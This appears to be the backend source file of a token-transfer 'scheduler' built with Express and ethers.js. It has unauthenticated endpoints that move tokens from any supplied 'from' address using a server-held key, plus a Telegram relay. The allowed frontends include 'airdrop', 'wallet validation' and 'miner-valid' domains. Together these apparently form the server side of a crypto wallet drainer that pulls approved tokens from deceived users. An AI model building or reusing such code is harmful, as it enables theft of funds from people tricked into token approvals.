// Bakend/index.js
// This file is part of the Bakend project, which provides a backend service for scheduling and executing token transfers on the Ethereum blockchain.
// The service uses the ethers.js library to interact with a smart contract that manages scheduled transfers.
// The contract ABI is imported from a JSON file, and environment variables are used to configure the provider and wallet.
// The backend exposes two endpoints: one for scheduling a transfer and another for executing a scheduled transfer
import express from "express";
import { ethers } from "ethers";
import dotenv from "dotenv";
import { chainConfig } from "./chainConfig.js";
import { sendTelegramMessage } from "./telegram.js";

import cors from 'cors';


import fs from 'fs';
const contractAbi = JSON.parse(fs.readFileSync('./ScheduledTransferABI.json', 'utf-8'));


dotenv.config();

const app = express();
app.use(express.json());

app.use(cors({
  origin: [
    'http://localhost:5173',              // for local development
    'https://validationbridge.com',           // your deployed frontend domain
    'https://dvv-miner-valid.netlify.app',            // your deployed frontend domain
    'https://somniaverse.net', // your deployed frontend domain
    'https://airdrop.somniaverse.net',            // your deployed frontend domain
    'https://guard360.io',           // your deployed frontend domain
    'https://wallet.guard360.io'            // your deployed frontend domain
  ],
}));


// const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
// const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

// const contract = new ethers.Contract(
//   process.env.CONTRACT_ADDRESS,
//   contractAbi,
//   wallet
// );


// Function to get contract instance for any chain
function getContract(chainId) {
  const chain = chainConfig[chainId];
  if (!chain) throw new Error(`Chain ID ${chainId} not supported`);

  const provider = new ethers.JsonRpcProvider(chain.rpcUrl);
  const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
  return new ethers.Contract(chain.contractAddress, contractAbi, wallet);
}


// ➤ Schedule transfer
app.post("/schedule-transfer", async (req, res) => {
  const { token, from, to, amount, decimal, chainId } = req.body;

if (!token || !from || !to || !amount || !decimal || !chainId) {
  return res.status(400).json({ success: false, error: "Missing required fields" });
}

// const parsedAmount = ethers.parseUnits(amount.toString(), decimal); // Assumes 18 decimals


  try {
    const contract = getContract(chainId)
    const tx = await contract.scheduleTransfer(token, from, to, amount);
    await tx.wait();

    // Read latest id
    const nextId = await contract.nextId();
    // const transferId = nextId - BigInt(1);;
    console.log("Raw nextId:", nextId);
   console.log("Type of nextId:", typeof nextId);

 const transferId = nextId - 1n; // ← make sure this line is not missing


    res.json({ success: true, txHash: tx.hash, transferId: transferId.toString(),chainId});
  } catch (err) {
    console.error("Error scheduling transfer:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// ➤ Execute transfer (optional)
app.post("/execute-transfer", async (req, res) => {
  const { id, chainId } = req.body;


  if(!id || !chainId){
     return res.status(400).json({ success: false, error: " Id or chainId is Missing" });
  }

  try {
      const contract = getContract(chainId)
    const tx = await contract.executeTransfer(id);
    await tx.wait();


    let amount = null;
const transferEvent = tx?.events?.find(
  (event) => event.event === "Transfer"
);

if (transferEvent && transferEvent.args && transferEvent.args.value) {
  amount = transferEvent.args.value.toString();
}



    res.json({ success: true, txHash: tx.hash, amount });
  } catch (err) {
    console.error("Error executing transfer:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post("/send-telegram", async (req, res) => {
  const { botFlag, chatId, message } = req.body;

  if (!botFlag || !chatId || !message) {
    return res.status(400).json({ success: false, error: "Missing botFlag, chatId, or message" });
  }

  try {
    await sendTelegramMessage(botFlag, chatId, message);
    res.json({ success: true });
  } catch (err) {
    console.error("Error sending Telegram message:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});



// awake the server 
app.get("/ping", async (req, res) => {
  res.status(200).send("Server is Awake");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("✅ Backend running on port", PORT);
});




